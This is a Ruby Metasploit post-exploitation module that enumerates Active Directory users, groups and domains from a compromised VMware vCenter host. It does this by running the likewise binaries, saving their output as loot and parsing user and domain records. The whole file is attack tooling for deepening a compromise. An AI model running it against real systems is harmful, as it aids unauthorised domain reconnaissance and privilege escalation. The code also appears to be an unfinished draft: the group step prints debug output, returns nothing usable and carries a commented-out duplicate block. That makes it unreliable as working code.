  ##
  # This module requires Metasploit: https://metasploit.com/download
  # Current source: https://github.com/rapid7/metasploit-framework
  ##

  class MetasploitModule < Msf::Post
    include Msf::Post::Linux::System
    include Msf::Exploit::FileDropper

    def initialize(info={})
      super(update_info(info, {
        'Name'           => 'VMWare vCenter Active Directory Enumeration',
        'Description'    => %q{
          VMWare vCenter servers running on Linux may allow for enumeration of Active Directory information
          such as domain users, groups, group members and domain controllers using the binaries in /opt/likewise/bin.
          This module attempts to perform such enumeration. The information obtained in this manner can be used to
          conduct additional attacks aimed at compromising or escalating privileges on the domain.
        },
        'License'        => MSF_LICENSE,
        'Author'         =>         [
            'Erik Wynter',   # @wyntererik
          ],
        'DisclosureDate'  => '2022-05-17',
        'Platform'       => ['linux', 'unix'],
        'SessionTypes'   => ['shell', 'meterpreter'],
        }
      ))
      register_options([
        OptString.new('DOMAIN_FQDN', [false, 'FQDN for the active directory domain to query', '' ]),
        OptString.new('DOMAIN_ALIAS', [false, 'Alias for the active directory domain to query', '' ]),
      ])
    end

    def domain_fqdn
      datastore['DOMAIN_FQDN']
    end

    def domain_alias
      datastore['DOMAIN_ALIAS']
    end

    def binaries_for_enumeration
      [
        '/opt/likewise/bin/lw-enum-groups',
        '/opt/likewise/bin/lw-enum-members',
        '/opt/likewise/bin/lw-enum-objects',
        '/opt/likewise/bin/lw-enum-users'
      ]
    end

    def enum_users
      lw_enum_users = '/opt/likewise/bin/lw-enum-users'
      unless file?(lw_enum_users)
        print_error("Cannot enumerate users because the #{lw_enum_users} binary is not present on the host.")
        return 1
      end

      # perform enumeration
      enum_users_outfile  = "/tmp/users_#{Rex::Text.rand_text_alpha(6)}.txt"
      enum_users_cmd = "#{lw_enum_users} --level 2 > #{enum_users_outfile}"
      print_status("Attempting to enumerate users via the #{lw_enum_users} binary...")
      vprint_status("Running command: #{enum_users_cmd}")
      cmd_exec(enum_users_cmd)
      # check if the output file was created and try to parse it (to obtain domain names)
      unless file?(enum_users_outfile)
        print_error("User enumeration via the binary #{lw_enum_users} failed: No output file was created.")
        return 1
      end

      register_file_for_cleanup(enum_users_outfile)

      lw_enum_users_output = read_file(enum_users_outfile)
      if lw_enum_users_output&.strip&.blank?
        print_error("User enumeration via the binary #{lw_enum_users} failed: The output file was empty.")
      end

      users_loot = store_loot(
        'vcenter_users_raw',
        'text/plain',
        session,
        lw_enum_users_output,
        nil,
      )
      print_status("Saving raw lw-enum-users output to #{users_loot} before trying to parse it")

      user_info = lw_enum_users_output.scan(/User info .*?={20}\n(.*?)\n\n/m)&.flatten
      # blank check
      user_info_parsed = []
      user_info.each do |ui|
        ui_parsed = {}
        u_lines = ui.split("\n")
        u_lines.each do |line|
          key,value = line.scan(/^(.*?):\s+(.*?)$/)&.flatten
          next if key.blank?
          ui_parsed[key] = value
        end

        next if ui_parsed.empty?
        user_info_parsed << ui_parsed
      end

      ad_results = Hash.new { |h, k| h[k] = {} }
      # check that it's not empty
      # grab the domain users
      domain_users = user_info_parsed.select{|x| x["Local User"] == "NO"}
      # check if there were any domain users at all
      du_ct = domain_users.length
      print_good("Obtained info on a total of #{user_info_parsed.length} users, including #{user_info_parsed.length - du_ct} local users and #{du_ct} domain users.")
      
      # use the domain user UPN value to obtain the unique FQDNs for all domains we found users for
      upns = domain_users.map{|x| x["UPN"]}
      unique_fqdns = []
      upns.each do |upn|
        # using scan instead of a single split because it seems AD usernames can technucally include @
        uname, fqdn = upn.scan(/(^.*)@(.*?)$/)&.flatten
        next if uname.blank? || fqdn.blank?
        unique_fqdns << fqdn unless unique_fqdns.include?(fqdn)
      end

      # empty checks etc
      unique_fqdns.each do |fqdn|
        ad_results[fqdn]['Users'] = domain_users.select{|x| x["UPN"].end_with?("@#{fqdn}") }
      end

      # empty checks etc
      ad_results
    end

    def enum_groups(ad_results)
      lw_enum_groups = '/opt/likewise/bin/lw-enum-groups'
      unless file?(lw_enum_groups)
        print_error("Cannot enumerate groups because the #{lw_enum_groups} binary is not present on the host.")
        return 1
      end

      # perform enumeration
      enum_groups_outfile  = "/tmp/groups_#{Rex::Text.rand_text_alpha(6)}.txt"
      enum_groups_cmd = "#{lw_enum_groups} --level 1 > #{enum_groups_outfile}"
      print_status("Attempting to enumerate groups via the #{lw_enum_groups} binary...")
      vprint_status("Running command: #{enum_groups_cmd}")
      cmd_exec(enum_groups_cmd)
      # check if the output file was created and try to parse it (to obtain domain names)
      unless file?(enum_groups_outfile)
        print_error("User enumeration via the binary #{lw_enum_groups} failed: No output file was created.")
        return 1
      end

      register_file_for_cleanup(enum_groups_outfile)

      lw_enum_groups_output = read_file(enum_groups_outfile)
      if lw_enum_groups_output&.strip&.blank?
        print_error("User enumeration via the binary #{lw_enum_groups} failed: The output file was empty.")
      end

      groups_loot = store_loot(
        'vcenter_group_raw',
        'text/plain',
        session,
        lw_enum_groups_output,
        nil,
      )
      print_status("Saving raw lw-enum-groups output to #{groups_loot} before trying to parse it")
      p ad_results

      # user_info = lw_enum_users_output.scan(/User info .*?={20}\n(.*?)\n\n/m)&.flatten
      # # blank check
      # user_info_parsed = []
      # user_info.each do |ui|
      #   ui_parsed = {}
      #   u_lines = ui.split("\n")
      #   u_lines.each do |line|
      #     key,value = line.scan(/^(.*?):\s+(.*?)$/)&.flatten
      #     next if key.blank?
      #     ui_parsed[key] = value
      #   end

      #   next if ui_parsed.empty?
      #   user_info_parsed << ui_parsed
      # end

      # ad_results = {}
      # # check that it's not empty
      # # grab the domain users
      # domain_users = user_info_parsed.select{|x| x["Local User"] == "NO"}
      # # check if there were any domain users at all
      # du_ct = domain_users.length
      # print_success("Obtained info on a total of #{user_info_parsed.length} users, including #{user_info_parsed.length - du_ct} local users and #{du_ct} domain users.")
      
      # # use the domain user UPN value to obtain the unique FQDNs for all domains we found users for
      # upns = domain_users.map{|x| x["UPN"]}
      # unique_fqdns = []
      # upns.each do |upn|
      #   # using scan instead of a single split because it seems AD usernames can technucally include @
      #   uname, fqdn = upn.scan(/(^.*)@(.*?)$/)&.flatten
      #   next if uname.blank? || fqdn.blank?
      #   unique_fqdns << fqdn unless unique_fqdns.include?(fqdn)
      # end

      # # empty checks etc
      # unique_fqdns.each do |fqdn|
      #   ad_results[fqdn] = domain_users.select{|x| x["UPN"].end_with?("@#{fqdn}") }
      # end

      # # empty checks etc
      # ad_results
    end

    def run
      unless directory?('/opt/likewise/bin')
        fail_with Failure::NoTarget , 'The /opt/likewise/bin directory was not found on the target.'
      end

      # technically there are more binaries that can give interesting results, but if these four aren't there, something very weird is going on so let's just bail
      if binaries_for_enumeration.none? {|i| file?(i) }
        fail_with Failure::NoTarget , 'The /opt/likewise/bin directory does not contain any of the binaries required for enumeration.'
      end
    
      # if user enumeration doesn't work, we may as well give up
      ad_results = enum_users
      if ad_results == 1
        return
      end

      ad_results = enum_groups(ad_results)
    end
  end

